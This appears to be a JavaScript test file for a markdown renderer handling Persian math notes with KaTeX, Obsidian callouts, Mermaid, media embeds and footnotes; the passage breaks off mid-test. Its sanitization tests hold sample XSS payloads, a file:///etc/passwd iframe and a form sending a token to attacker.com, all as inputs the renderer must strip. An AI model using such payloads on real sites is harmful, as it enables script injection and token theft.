import test, { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { renderMarkdown, buildKnowledge, noteMetadata } from '../../frontend/src/lib/markdown.mjs';

describe('E2E Content Markdown Rendering Pipeline', () => {

  // =========================================================================
  // 1. LaTeX / KaTeX Math
  // =========================================================================
  describe('1. LaTeX / KaTeX Math Rendering', () => {
    it('renders inline math ($...$) with KaTeX classes and MathML semantics', async () => {
      const input = 'فرمول درون‌خطی $f(x) = x^2 + 2x + 1$ در متن فارسی.';
      const html = await renderMarkdown(input);

      assert.match(html, /<span class="katex">/);
      assert.match(html, /<math xmlns="http:\/\/www\.w3\.org\/1998\/Math\/MathML">/);
      assert.match(html, /<annotation encoding="application\/x-tex">f\(x\) = x\^2 \+ 2x \+ 1<\/annotation>/);
      assert.match(html, /<span class="katex-html" aria-hidden="true">/);
      // Ensure Persian text precedes and follows the math span cleanly
      assert.match(html, /فرمول درون‌خطی <span class="katex">.+<\/span> در متن فارسی\./s);
    });

    it('renders display math ($$...$$) in block and standalone form', async () => {
      const input = `متن قبل از فرمول بلوکی:

$$\\int_{0}^{\\infty} e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$$

متن بعد از فرمول.`;
      const html = await renderMarkdown(input);

      assert.match(html, /<span class="katex-display">/);
      assert.match(html, /<math xmlns="http:\/\/www\.w3\.org\/1998\/Math\/MathML" display="block">/);
      assert.match(html, /e\^\{-x\^2\}/);
    });

    it('converts display math ($$...$$) embedded inside prose into display blocks', async () => {
      const input = 'متن فارسی $$E = mc^2$$ ادامه متن فارسی';
      const html = await renderMarkdown(input);

      assert.match(html, /<p>متن فارسی <\/p>/);
      assert.match(html, /<span class="katex-display">/);
      assert.match(html, /<p> ادامه متن فارسی<\/p>/);
    });

    it('renders mathematical matrices: pmatrix, vmatrix, cases, and aligned environments', async () => {
      const input = `
ماتریس پرانتزی:
$$\\begin{pmatrix} 1 & 2 \\\\ 3 & 4 \\end{pmatrix}$$

دترمینان ماتریس:
$$\\begin{vmatrix} a & b \\\\ c & d \\end{vmatrix} = ad - bc$$

تابع چندضابطه‌ای:
$$f(x) = \\begin{cases} x^2 & x \\ge 0 \\\\ -x & x < 0 \\end{cases}$$

معادلات تراز شده:
$$\\begin{aligned} (x+y)^2 &= (x+y)(x+y) \\\\ &= x^2 + 2xy + y^2 \\end{aligned}$$
`;
      const html = await renderMarkdown(input);

      // pmatrix
      assert.match(html, /matrix/);
      assert.match(html, /pmatrix/);
      // vmatrix
      assert.match(html, /vmatrix/);
      // cases
      assert.match(html, /cases/);
      // aligned
      assert.match(html, /aligned/);
      // Confirm all 4 environments rendered with KaTeX
      const displayBlocks = html.match(/class="katex-display"/g) ?? [];
      assert.equal(displayBlocks.length, 4);
    });

    it('maintains LTR isolation in Persian text flow and preserves code fences without rendering math', async () => {
      const input = `
در جبر خطی، اگر $T: V \\to W$ یک تبدیل خطی باشد، آنگاه $\\ker(T)$ زیرفضای $V$ است.

کد متلب زیر نباید به عنوان ریاضی کامپایل شود:
\`$x + y = z$\`

\`\`\`latex
\\begin{equation}
  \\oint_C \\vec{B} \\cdot d\\vec{\\ell} = \\mu_0 I_{\\text{enc}}
\\end{equation}
\`\`\`
`;
      const html = await renderMarkdown(input);

      // Math in prose is rendered
      assert.match(html, /<span class="katex">/);
      assert.match(html, /\\ker\(T\)/);

      // Code fences and inline code keep literal formula delimiters
      assert.match(html, /<code>\$x \+ y = z\$<\/code>/);
      assert.match(html, /\\oint_C \\vec\{B\}/);
      // Fenced block remains in pre/code and is not parsed as katex
      assert.match(html, /<pre[^>]*><code class="language-latex">/);
    });
  });

  // =========================================================================
  // 2. Callouts
  // =========================================================================
  describe('2. Callouts (Obsidian Types, Aliases, Math Callouts, Collapsible)', () => {
    const officialAndAliasTypes = [
      'note', 'abstract', 'summary', 'tldr',
      'info', 'todo',
      'tip', 'hint', 'important',
      'success', 'check', 'done',
      'question', 'help', 'faq',
      'warning', 'caution', 'attention',
      'failure', 'fail', 'missing',
      'danger', 'error',
      'bug',
      'example',
      'quote', 'cite'
    ];

    const mathTypes = [
      'theorem', 'definition', 'lemma', 'corollary', 'proof', 'solution', 'pitfall'
    ];

    it('renders all official Obsidian callout types and aliases with data-callout-type', async () => {
      for (const type of officialAndAliasTypes) {
        const input = `> [!${type.toUpperCase()}]\n> محتوای کال‌اوت برای نوع ${type}.`;
        const html = await renderMarkdown(input);

        assert.match(html, new RegExp(`data-callout-type="${type.toLowerCase()}"`), `Failed to render callout type: ${type}`);
        assert.match(html, /data-callout-title/);
        assert.match(html, /data-callout-body/);
        assert.match(html, new RegExp(`محتوای کال‌اوت برای نوع ${type}`));
      }
    });

    it('renders all mathematical callouts (theorem, definition, lemma, corollary, proof, solution, pitfall)', async () => {
      for (const mathType of mathTypes) {
        const input = `> [!${mathType.toUpperCase()}] عنوان ریاضی\n> فرض کنید $V$ یک فضای برداری باشد.`;
        const html = await renderMarkdown(input);

        assert.match(html, new RegExp(`data-callout-type="${mathType.toLowerCase()}"`), `Failed to render math callout: ${mathType}`);
        assert.match(html, /عنوان ریاضی/);
        assert.match(html, /class="katex"/);
        assert.match(html, /فضای برداری/);
      }
    });

    it('renders collapsible callouts with open (+) and closed (-) state correctly', async () => {
      const openCallout = `> [!THEOREM]+ قضیه باز شونده\n> متن درون قضیه`;
      const openHtml = await renderMarkdown(openCallout);

      assert.match(openHtml, /<details[^>]*data-callout[^>]*data-callout-type="theorem"[^>]*open>/);
      assert.match(openHtml, /<summary data-callout-title>قضیه باز شونده<\/summary>/);
      assert.match(openHtml, /<div data-callout-body>/);
      assert.match(openHtml, /متن درون قضیه/);

      const closedCallout = `> [!PROOF]- اثبات بسته (جمع‌شونده)\n> متن درون اثبات`;
      const closedHtml = await renderMarkdown(closedCallout);

      assert.match(closedHtml, /<details[^>]*data-callout[^>]*data-callout-type="proof"/);
      // Must not have open attribute
      const detailsTag = closedHtml.match(/<details[^>]*>/)?.[0] ?? '';
      assert.doesNotMatch(detailsTag, /\bopen\b/);
      assert.match(closedHtml, /<summary data-callout-title>اثبات بسته \(جمع‌شونده\)<\/summary>/);
      assert.match(closedHtml, /متن درون اثبات/);
    });

    it('renders title-only callouts with custom and default titles without an empty body', async () => {
      // With custom title, no body
      const titleOnlyCustom = `> [!TIP] نکته مهم آزمون`;
      const htmlCustom = await renderMarkdown(titleOnlyCustom);

      assert.match(htmlCustom, /<div data-callout data-callout-type="tip">/);
      assert.match(htmlCustom, /<div data-callout-title>نکته مهم آزمون<\/div>/);
      assert.doesNotMatch(htmlCustom, /data-callout-body/);

      // Without custom title and no body (default title inferred)
      const titleOnlyDefault = `> [!WARNING]`;
      const htmlDefault = await renderMarkdown(titleOnlyDefault);

      assert.match(htmlDefault, /<div data-callout data-callout-type="warning">/);
      assert.match(htmlDefault, /<div data-callout-title>Warning<\/div>/);
      assert.doesNotMatch(htmlDefault, /data-callout-body/);
    });
  });

  // =========================================================================
  // 3. Mermaid Diagrams
  // =========================================================================
  describe('3. Mermaid Diagrams', () => {
    it('converts ```mermaid code block into <figure class="mermaid-diagram" data-mermaid> with chart div and collapsible details', async () => {
      const mermaidCode = `graph TD
    A["شروع"] --> B{"شرط منطقی"}
    B -- بله --> C["پایان"]
    B -- خیر --> A`;
      const input = `\`\`\`mermaid\n${mermaidCode}\n\`\`\``;
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="mermaid-diagram" data-mermaid="">/);
      assert.match(html, /<div class="mermaid-chart" data-mermaid-source="[^"]+">در حال ترسیم نمودار…<\/div>/);
      assert.match(html, /<details class="mermaid-details">/);
      assert.match(html, /<summary>کد منبع Mermaid<\/summary>/);
      assert.match(html, /<pre tabindex="0" role="region" aria-label="بلوک کد">/);
      assert.match(html, /graph TD/);

      // Verify the source attribute contains encoded Mermaid source
      const encodedSourceMatch = html.match(/data-mermaid-source="([^"]+)"/);
      assert.ok(encodedSourceMatch, 'data-mermaid-source attribute not found');
      const decodedSource = decodeURIComponent(encodedSourceMatch[1]);
      assert.match(decodedSource, /A\["شروع"\]/);
      assert.match(decodedSource, /B\{"شرط منطقی"\}/);
    });

    it('handles flowchart alias similarly for Mermaid diagrams', async () => {
      const input = `\`\`\`flowchart\nflowchart LR\n  X --> Y\n\`\`\``;
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="mermaid-diagram" data-mermaid="">/);
      assert.match(html, /data-mermaid-source="flowchart%20LR%0A%20%20X%20--%3E%20Y"/);
    });
  });

  // =========================================================================
  // 4. Obsidian Canvas (.canvas)
  // =========================================================================
  describe('4. Obsidian Canvas (.canvas)', () => {
    it('converts ![[diagram.canvas]] into <figure class="canvas-diagram" data-canvas-url="...">', async () => {
      const input = 'نمای کلی مفاهیم در بوم زیر ترسیم شده است:\n\n![[concept-map.canvas]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="canvas-diagram" data-canvas-url="\/vault\/concept-map\.canvas" data-canvas-title="concept-map\.canvas">/);
      assert.match(html, /<div class="canvas-placeholder">در حال بارگذاری بوم: concept-map\.canvas<\/div>/);
    });

    it('handles canvas embeds with nested vault paths', async () => {
      const input = '![[algebra/linear-maps.canvas]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="canvas-diagram" data-canvas-url="\/vault\/algebra\/linear-maps\.canvas" data-canvas-title="algebra\/linear-maps\.canvas">/);
      assert.match(html, /در حال بارگذاری بوم: algebra\/linear-maps\.canvas/);
    });
  });

  // =========================================================================
  // 5. Media Embeds (PDF, Audio, Video, Vault Images)
  // =========================================================================
  describe('5. Media Embeds (PDF, Audio, Video, Images)', () => {
    it('converts ![[doc.pdf#page=12&height=480]] into responsive pdf iframe with page anchor and custom height', async () => {
      const input = '![[calculus-spivak.pdf#page=12&height=480]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="pdf-embed-wrapper">/);
      assert.match(html, /<iframe src="\/vault\/calculus-spivak\.pdf#page=12"/);
      assert.match(html, /class="pdf-embed"/);
      assert.match(html, /style="width:100%;height:480px;border:1px solid var\(--border\);border-radius:0\.5rem;"/);
      assert.match(html, /title="calculus-spivak\.pdf"/);
      assert.match(html, /loading="lazy"/);
    });

    it('supports PDF height specified via alias format ![[doc.pdf|600]]', async () => {
      const input = '![[linear-algebra-axler.pdf|600]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="pdf-embed-wrapper">/);
      assert.match(html, /<iframe src="\/vault\/linear-algebra-axler\.pdf"/);
      assert.match(html, /height:600px;/);
    });

    it('converts audio embeds (![[audio.mp3]], .wav, .ogg, .m4a) to HTML5 audio element', async () => {
      const formats = ['podcast.mp3', 'rec.wav', 'notes.ogg', 'lecture.m4a'];
      for (const file of formats) {
        const input = `![[${file}]]`;
        const html = await renderMarkdown(input);

        assert.match(html, /<figure class="audio-embed-wrapper">/);
        assert.match(html, new RegExp(`<audio controls src="\\/vault\\/${file}" class="audio-embed" preload="metadata"><\\/audio>`));
      }
    });

    it('converts video embeds (![[video.mp4]], .webm, .ogv) to HTML5 video element', async () => {
      const formats = ['recording.mp4', 'presentation.webm', 'archive.ogv'];
      for (const file of formats) {
        const input = `![[${file}]]`;
        const html = await renderMarkdown(input);

        assert.match(html, /<figure class="video-embed-wrapper">/);
        assert.match(html, new RegExp(`<video controls src="\\/vault\\/${file}" class="video-embed"`));
        assert.match(html, /preload="metadata"/);
      }
    });

    it('resolves known vault images with width and height (![[pic.png|300x200]])', async () => {
      // Integral.png exists in vault-assets.json
      const input = '![[Integral.png|300x200]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<img src="\/vault\/math-freamwork\/04%20Sources\/Pictures\/Notes\/Integral\.png"/);
      assert.match(html, /alt="Integral\.png"/);
      assert.match(html, /loading="lazy"/);
      assert.match(html, /width="300"/);
      assert.match(html, /height="200"/);
    });

    it('resolves known vault images with width only (![[pic.png|400]])', async () => {
      const input = '![[Integral.png|400]]';
      const html = await renderMarkdown(input);

      assert.match(html, /<img src="\/vault\/math-freamwork\/04%20Sources\/Pictures\/Notes\/Integral\.png"/);
      assert.match(html, /width="400"/);
      assert.doesNotMatch(html, /height=/);
    });

    it('rejects path traversal and unregistered images', async () => {
      const input = '![[../../secret.png]]\n\n![[non-existent-image-404.png]]';
      const html = await renderMarkdown(input);

      // Must not render an <img> tag or image src for unauthorized or missing assets
      assert.doesNotMatch(html, /<img/);
      assert.doesNotMatch(html, /src="[^"]*secret\.png"/);
      // Instead, it is treated as an unresolved/missing wiki embed
      assert.match(html, /class="wiki-missing"/);
    });
  });

  // =========================================================================
  // 6. Obsidian Markdown Extras (Highlights, Comments, Tags)
  // =========================================================================
  describe('6. Obsidian Markdown Extras', () => {
    it('converts ==highlighted text== to <mark> elements', async () => {
      const input = 'این یک متن دارای ==نکته بسیار اساسی== در ریاضیات است.';
      const html = await renderMarkdown(input);

      assert.match(html, /<mark>نکته بسیار اساسی<\/mark>/);
    });

    it('strips %%hidden comments%% outside code blocks for both inline and multiline comments', async () => {
      const input = `متن قبل %%کامنت درون‌خطی مخفی%% متن بعد.

%%
کامنت
چندخطی
که باید کاملاً
حذف شود
%%

متن پایانی.`;
      const html = await renderMarkdown(input);

      assert.doesNotMatch(html, /کامنت درون‌خطی مخفی/);
      assert.doesNotMatch(html, /کامنت\s+چندخطی/);
      assert.doesNotMatch(html, /حذف شود/);
      assert.match(html, /متن قبل  متن بعد\./);
      assert.match(html, /متن پایانی\./);
    });

    it('preserves %%comments%% inside inline code and fenced code blocks', async () => {
      const input = `کد درون‌خطی: \`%%not hidden%%\`

\`\`\`python
# %%section: data preprocessing%%
x = 42
\`\`\``;
      const html = await renderMarkdown(input);

      assert.match(html, /<code>%%not hidden%%<\/code>/);
      assert.match(html, /%%section: data preprocessing%%/);
    });

    it('converts #tag in prose into <a class="tag" href="/search?tag=...">', async () => {
      const input = `برچسب‌های فارسی #جبر_خطی و #آنالیز_حقیقی
برچسب‌های انگلیسی #linear-algebra و #calculus
برچسب تو در تو #math/abstract-algebra
برچسب در انتهای جمله #هندسه.`;

      const html = await renderMarkdown(input);

      assert.match(html, /<a class="tag" href="\/search\?tag=%D8%AC%D8%A8%D8%B1_%D8%AE%D8%B7%DB%8C">#جبر_خطی<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=%D8%A2%D9%86%D8%A7%D9%84%DB%8C%D8%B2_%D8%AD%D9%82%DB%8C%D9%82%DB%8C">#آنالیز_حقیقی<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=linear-algebra">#linear-algebra<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=calculus">#calculus<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=math%2Fabstract-algebra">#math\/abstract-algebra<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=%D9%87%D9%86%D8%AF%D8%B3%D9%87">#هندسه<\/a>/);
    });

    it('does not turn markdown headings or standalone numbers into tag links', async () => {
      const input = `# تیتر سطح یک

شماره پیگیری #12345 است.`;
      const html = await renderMarkdown(input);

      assert.match(html, /<h1 id="تیتر-سطح-یک">تیتر سطح یک<\/h1>/);
      assert.doesNotMatch(html, /<a class="tag"[^>]*>#تیتر/);
      assert.doesNotMatch(html, /<a class="tag"[^>]*>#12345/);
    });
  });

  // =========================================================================
  // 7. Safe HTML & iframes Sanitization
  // =========================================================================
  describe('7. Safe HTML & Iframes Sanitization', () => {
    it('secures iframe by appending sandbox and loading="lazy" attributes', async () => {
      const input = '<iframe src="https://example.org/embed" width="600" height="400"></iframe>';
      const html = await renderMarkdown(input);

      assert.match(html, /<iframe src="https:\/\/example\.org\/embed" width="600" height="400" sandbox="allow-scripts allow-same-origin allow-popups" loading="lazy"><\/iframe>/);
    });

    it('strips iframes with unsafe or javascript/data src protocols', async () => {
      const input = `
<iframe src="javascript:alert('xss')"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="file:///etc/passwd"></iframe>
`;
      const html = await renderMarkdown(input);

      assert.doesNotMatch(html, /<iframe src="javascript:/i);
      assert.doesNotMatch(html, /<iframe src="data:/i);
      assert.doesNotMatch(html, /<iframe src="file:/i);
    });

    it('strips dangerous active tags (<script>, <style>, <object>, <applet>, <form>)', async () => {
      const input = `
متن سالم
<script>alert('xss')</script>
<style>body { display: none; }</style>
<object data="malicious.swf"></object>
<applet code="evil.class"></applet>
<form action="https://attacker.com/steal"><input name="token" /></form>
`;
      const html = await renderMarkdown(input);

      assert.match(html, /متن سالم/);
      assert.doesNotMatch(html, /<script[\s\S]*?<\/script>/i);
      assert.doesNotMatch(html, /<style[\s\S]*?<\/style>/i);
      assert.doesNotMatch(html, /<object[\s\S]*?>/i);
      assert.doesNotMatch(html, /<applet[\s\S]*?>/i);
      assert.doesNotMatch(html, /<form[\s\S]*?>/i);
    });

    it('strips inline on* event handlers from all HTML elements', async () => {
      const input = `
<button onclick="alert('hacked')">کلیک کن</button>
<span onmouseover="stealCookies()" onfocus="evil()">متن</span>
<a href="https://example.com" onload="attack()">پیوند</a>
`;
      const html = await renderMarkdown(input);

      assert.doesNotMatch(html, /\bonclick\s*=/i);
      assert.doesNotMatch(html, /\bonmouseover\s*=/i);
      assert.doesNotMatch(html, /\bonfocus\s*=/i);
      assert.doesNotMatch(html, /\bonload\s*=/i);
      assert.match(html, /<button>کلیک کن<\/button>/);
    });

    it('neutralizes javascript: URIs in markdown links and HTML hrefs', async () => {
      const input = `
[لینک مخرب](javascript:alert(1))
<a href="javascript:void(0)">لینک اچ‌تی‌ام‌ال</a>
`;
      const html = await renderMarkdown(input);

      assert.doesNotMatch(html, /href="javascript:/i);
    });

    it('allows safe formatting tags such as <kbd>, <u>, <b>, <i>, <sub>, <sup>', async () => {
      const input = 'کلید <kbd>Ctrl+C</kbd> برای کپی و <u>متن زیرخط‌دار</u> و <b>پررنگ</b> و <i>مورب</i> و $H$<sub>2</sub>$O$ و $x$<sup>2</sup>.';
      const html = await renderMarkdown(input);

      assert.match(html, /<kbd>Ctrl\+C<\/kbd>/);
      assert.match(html, /<u>متن زیرخط‌دار<\/u>/);
      assert.match(html, /<b>پررنگ<\/b>/);
      assert.match(html, /<i>مورب<\/i>/);
      assert.match(html, /<sub>2<\/sub>/);
      assert.match(html, /<sup>2<\/sup>/);
    });
  });

  // =========================================================================
  // 8. GFM Tables, Checklists, Footnotes
  // =========================================================================
  describe('8. GFM Tables, Checklists, and Footnotes', () => {
    it('wraps GFM tables in keyboard-accessible table-scroll container with alignment preserved', async () => {
      const input = `
| نماد | مفهوم | راست‌چین | وسط‌چین |
| :--- | :--- | ---: | :---: |
| $\\mathbb{R}$ | اعداد حقیقی | مثبت | صفر |
| $\\mathbb{C}$ | اعداد مختلط | موهومی | صفر |
`;
      const html = await renderMarkdown(input);

      // Wrapper check
      assert.match(html, /<div class="table-scroll" role="region" tabindex="0"><table>/);
      assert.match(html, /<\/table><\/div>/);

      // Alignment check
      assert.match(html, /<th align="right">راست‌چین<\/th>/);
      assert.match(html, /<th align="center">وسط‌چین<\/th>/);
      assert.match(html, /<td align="right">مثبت<\/td>/);
      assert.match(html, /<td align="center">صفر<\/td>/);

      // Math inside table cells
      assert.match(html, /<span class="katex">/);
    });

    it('renders GFM task checklists (- [ ] and - [x]) as disabled checkboxes', async () => {
      const input = `
- [x] یادگیری مفاهیم پایه‌ای جبر خطی
- [ ] حل تمرین‌های فصل سوم کتاب
- [x] مرور قضایای استقلال خطی
`;
      const html = await renderMarkdown(input);

      assert.match(html, /<input[^>]*type="checkbox"[^>]*checked[^>]*disabled/);
      assert.match(html, /<input[^>]*type="checkbox"[^>]*disabled/);

      const checkboxes = html.match(/<input[^>]*type="checkbox"/g) ?? [];
      assert.equal(checkboxes.length, 3);

      const checked = html.match(/<input[^>]*type="checkbox"[^>]*checked/g) ?? [];
      assert.equal(checked.length, 2);
    });

    it('renders footnotes ([^1]) with reference markers and backlinks section', async () => {
      const input = `
قضیه اساسی جبر بیان می‌کند هر چندجمله‌ای درجه $n$ حداقل یک ریشه در $\\mathbb{C}$ دارد[^fund-thm].
همچنین لم گوس نقش مهمی ایفا می‌کند[^gauss-lemma].

[^fund-thm]: اثبات‌های متعددی با استفاده از آنالیز مختلط و توپولوژی ارائه شده است.
[^gauss-lemma]: کارل فریدریش گوس در رساله دکترای خود به آن پرداخت.
`;
      const html = await renderMarkdown(input);

      // Footnote references in text
      assert.match(html, /<a href="#user-content-fn-fund-thm" id="user-content-fnref-fund-thm" data-footnote-ref aria-describedby="footnote-label">1<\/a>/);
      assert.match(html, /<a href="#user-content-fn-gauss-lemma" id="user-content-fnref-gauss-lemma" data-footnote-ref aria-describedby="footnote-label">2<\/a>/);

      // Footnotes section at bottom
      assert.match(html, /<section data-footnotes class="footnotes">/);
      assert.match(html, /<h2 class="sr-only" id="footnote-label">Footnotes<\/h2>/);
      assert.match(html, /<li id="user-content-fn-fund-thm">/);
      assert.match(html, /<li id="user-content-fn-gauss-lemma">/);

      // Backreferences
      assert.match(html, /<a href="#user-content-fnref-fund-thm" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">↩<\/a>/);
      assert.match(html, /<a href="#user-content-fnref-gauss-lemma" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">↩<\/a>/);
    });
  });

  // =========================================================================
  // 9. Interactive Plugins: GeoGebra & Excalidraw
  // =========================================================================
  describe('9. Interactive Plugins (GeoGebra & Excalidraw)', () => {
    it('converts ```geogebra block into interactive figure with configuration and controls', async () => {
      const input = `\`\`\`geogebra
appName: graphing
width: 800
height: 500
caption: "نمایش سهمی و خط مماس"
commands:
  - "f(x) = x^2"
  - "P = (1, 1)"
  - "Tangent(P, f)"
explain:
  - "معادله سهمی"
  - "نقطه روی منحنی"
\`\`\``;
      const html = await renderMarkdown(input);

      assert.match(html, /<figure class="language-geogebra" data-geogebra="[^"]+">/);
      assert.match(html, /<figcaption>نمایش سهمی و خط مماس<\/figcaption>/);
      assert.match(html, /<button type="button">بارگذاری رسم تعاملی<\/button>/);
      assert.match(html, /<div data-geogebra-host=""><\/div>/);
      assert.match(html, /<li>معادله سهمی<\/li>/);
      assert.match(html, /<li>نقطه روی منحنی<\/li>/);
      assert.match(html, /<summary>کد اصلی رسم<\/summary>/);

      // Verify the parsed JSON configuration inside data-geogebra
      const dataMatch = html.match(/data-geogebra="([^"]+)"/);
      assert.ok(dataMatch);
      const decodedConfig = JSON.parse(dataMatch[1].replace(/&#x22;/g, '"'));
      assert.equal(decodedConfig.appName, 'graphing');
      assert.equal(decodedConfig.width, 800);
      assert.equal(decodedConfig.height, 500);
      assert.deepEqual(decodedConfig.commands, ['f(x) = x^2', 'P = (1, 1)', 'Tangent(P, f)']);
    });

    it('renders Excalidraw scene note into <figure data-excalidraw="...">', async () => {
      const input = `---
excalidraw-plugin: parsed
---
\`\`\`json
{
  "type": "excalidraw",
  "elements": [
    {
      "type": "rectangle",
      "id": "rect-1",
      "x": 20,
      "y": 40,
      "width": 120,
      "height": 80
    }
  ],
  "appState": {
    "viewBackgroundColor": "#ffffff"
  }
}
\`\`\`
`;
      const html = await renderMarkdown(input);

      assert.match(html, /<figure data-excalidraw="[^"]+">در حال نمایش نقاشی…<\/figure>/);
      const dataMatch = html.match(/data-excalidraw="([^"]+)"/);
      assert.ok(dataMatch);
      const parsedScene = JSON.parse(dataMatch[1].replace(/&#x22;/g, '"'));
      assert.equal(parsedScene.elements[0].type, 'rectangle');
      assert.equal(parsedScene.elements[0].id, 'rect-1');
      assert.equal(parsedScene.elements[0].width, 120);
    });
  });

  // =========================================================================
  // 10. End-to-End Comprehensive Document & Knowledge Graph Pipeline
  // =========================================================================
  describe('10. End-to-End Comprehensive Document & Knowledge Graph Pipeline', () => {
    it('renders a full mathematical document containing all features simultaneously without conflicts', async () => {
      const fullDoc = `---
uid: "MK-E2E-01"
kind: "concept"
title_fa: "مستند جامع تست E2E"
tags: [جبر_خطی, تست_سیستم]
---

# معرفی فضای برداری

فضای برداری یک ساختار جبری است با ضرب اسکالر $a \\cdot v$ و جمع بردارها $u + v$.
نکته ==بسیار حیاتی== در قضیه پایه بودن بردارها نهفته است.

%%این کامنت باید از خروجی نهایی حذف شود%%

> [!THEOREM]+ قضیه بعد فضای برداری
> اگر $V$ یک فضای برداری متناهی‌البعد باشد:
> $$\\dim(V) = n < \\infty$$
> هر دو پایه از $V$ دارای تعداد اعضای برابر هستند.

> [!PROOF]- اثبات یکتایی بعد
> فرض کنید دو پایه $B_1$ و $B_2$ موجود باشند. با استفاده از لم تعویض استاینیتز اثبات می‌شود.

> [!PITFALL] دام مفهومی
> بردار صفر به تنهایی نمی‌تواند یک پایه تشکیل دهد.

جدول مشخصات ابعاد:

| زیرفضا | بعد | نماد |
| :--- | :---: | ---: |
| هسته تبدیل | $k$ | $\\ker(T)$ |
| تصویر تبدیل | $r$ | $\\text{im}(T)$ |

چک‌لیست بررسی خواص:
- [x] بسته بودن تحت جمع
- [x] بسته بودن تحت ضرب اسکالر
- [ ] وجود وارون جمعی

نمودار روابط فضایی:
\`\`\`mermaid
graph LR
  V["فضای مبدأ V"] -->|تبدیل خطی T| W["فضای مقصد W"]
  V --> Ker["هسته Ker(T)"]
\`\`\`

بوم مفهومی و رسانه‌ها:
![[linear-algebra.canvas]]
![[doc.pdf#page=1&height=400]]
![[podcast.mp3]]
![[video.mp4]]
![[Integral.png|300x150]]

برچسب‌ها: #جبر_خطی و #math/dimension در انتهای فصل.
ارجاع به مستندات رسمی[^ref-axler].

<iframe src="https://example.org/visualizer" width="600" height="350"></iframe>

[^ref-axler]: شلدون اکسلر، جبر خطی انجام شده به روش درست.
`;

      const html = await renderMarkdown(fullDoc);

      // Verify Frontmatter was stripped
      assert.doesNotMatch(html, /uid:\s*"MK-E2E-01"/);
      assert.doesNotMatch(html, /kind:\s*"concept"/);

      // Verify Heading & Paragraph
      assert.match(html, /<h1 id="معرفی-فضای-برداری">معرفی فضای برداری<\/h1>/);

      // Verify Math
      assert.match(html, /<span class="katex">/);
      assert.match(html, /<span class="katex-display">/);

      // Verify Highlight
      assert.match(html, /<mark>بسیار حیاتی<\/mark>/);

      // Verify Stripped Comment
      assert.doesNotMatch(html, /این کامنت باید از خروجی نهایی حذف شود/);

      // Verify Callouts
      assert.match(html, /data-callout-type="theorem"/);
      assert.match(html, /data-callout-type="proof"/);
      assert.match(html, /data-callout-type="pitfall"/);
      assert.match(html, /<details[^>]*open>/); // open theorem

      // Verify Table & Wrapper
      assert.match(html, /<div class="table-scroll" role="region" tabindex="0"><table>/);

      // Verify Checklists
      assert.match(html, /<input[^>]*type="checkbox"[^>]*checked[^>]*disabled/);
      assert.match(html, /<input[^>]*type="checkbox"[^>]*disabled/);

      // Verify Mermaid
      assert.match(html, /<figure class="mermaid-diagram" data-mermaid="">/);

      // Verify Canvas
      assert.match(html, /<figure class="canvas-diagram" data-canvas-url="\/vault\/linear-algebra\.canvas"/);

      // Verify Media Embeds
      assert.match(html, /<figure class="pdf-embed-wrapper"><iframe src="\/vault\/doc\.pdf#page=1"/);
      assert.match(html, /<figure class="audio-embed-wrapper"><audio/);
      assert.match(html, /<figure class="video-embed-wrapper"><video/);
      assert.match(html, /<img src="\/vault\/math-freamwork\/04%20Sources\/Pictures\/Notes\/Integral\.png"/);

      // Verify Tags
      assert.match(html, /<a class="tag" href="\/search\?tag=%D8%AC%D8%A8%D8%B1_%D8%AE%D8%B7%DB%8C">#جبر_خطی<\/a>/);
      assert.match(html, /<a class="tag" href="\/search\?tag=math%2Fdimension">#math\/dimension<\/a>/);

      // Verify Footnotes
      assert.match(html, /data-footnote-ref/);
      assert.match(html, /<section data-footnotes class="footnotes">/);

      // Verify Sanitized Iframe
      assert.match(html, /<iframe src="https:\/\/example\.org\/visualizer" width="600" height="350" sandbox="allow-scripts allow-same-origin allow-popups" loading="lazy"><\/iframe>/);
    });

    it('buildKnowledge pipeline: correctly resolves graph relations, note transclusions, and block references', async () => {
      const noteA = {
        slug: 'basis-theorem',
        title: 'قضیه پایه',
        current_content: `---
uid: "MK-01"
rel_requires:
  - "[[linear-independence]]"
---
# قضیه پایه

![[linear-independence]]

بررسی استقلال خطی در [[linear-independence#^def-indep]].
`
      };

      const noteB = {
        slug: 'linear-independence',
        title: 'استقلال خطی',
        current_content: `---
uid: "MK-02"
---
# استقلال خطی

مجموعه بردارها مستقل خطی هستند اگر تنها ترکیب خطی صفر، ضرایب صفر باشد. ^def-indep

> [!THEOREM] قضیه وجودی
> هر فضای برداری دارای پایه است.
`
      };

      const garden = await buildKnowledge([noteA, noteB]);
      const renderedA = garden.find(n => n.slug === 'basis-theorem');
      const renderedB = garden.find(n => n.slug === 'linear-independence');

      assert.ok(renderedA);
      assert.ok(renderedB);

      // Verify forward relation
      assert.deepEqual(renderedA.resolvedRelations.rel_requires, ['linear-independence']);
      // Verify reverse relation
      assert.deepEqual(renderedB.reverseRelations.rel_requires, ['basis-theorem']);

      // Verify transclusion expanded inside Note A
      assert.match(renderedA.html, /data-transclusion="linear-independence"/);
      assert.match(renderedA.html, /مجموعه بردارها مستقل خطی هستند/);

      // Verify block reference anchor in Note B
      assert.match(renderedB.html, /id="block-def-indep"/);
      // Verify link in Note A points to the block
      assert.match(renderedA.html, /href="\/notes\/linear-independence#block-def-indep"/);

      // Verify backlinks
      assert.ok(renderedB.backlinks.includes('basis-theorem'));
    });

    it('supports custom linkResolver option for resolving external and internal links', async () => {
      const linkResolver = (url) => {
        if (url === 'matrix-ops') return '/garden/matrices';
        if (url.endsWith('.md')) return '/docs/' + url.replace('.md', '');
        return null;
      };

      const input = `
پیوند داخلی ویکی [[matrix-ops|عملیات ماتریسی]]
پیوند فایلی [راهنما](guide.md)
